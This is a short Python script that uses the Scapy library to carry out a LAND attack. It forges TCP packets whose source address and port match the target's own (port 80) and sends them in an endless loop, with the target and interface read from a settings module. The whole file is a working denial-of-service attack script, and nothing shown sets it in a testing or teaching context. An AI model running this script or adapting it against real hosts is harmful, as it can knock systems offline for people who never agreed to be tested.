from scapy.all import *
from scapy.all import IP, TCP
import settings
"""
LAND attack (same source ip/port)
"""

pkt = IP(src=settings.destination_ip,dst=settings.destination_ip)/TCP(sport=80, dport=80)

send(pkt, iface=settings.source_interface, loop=1)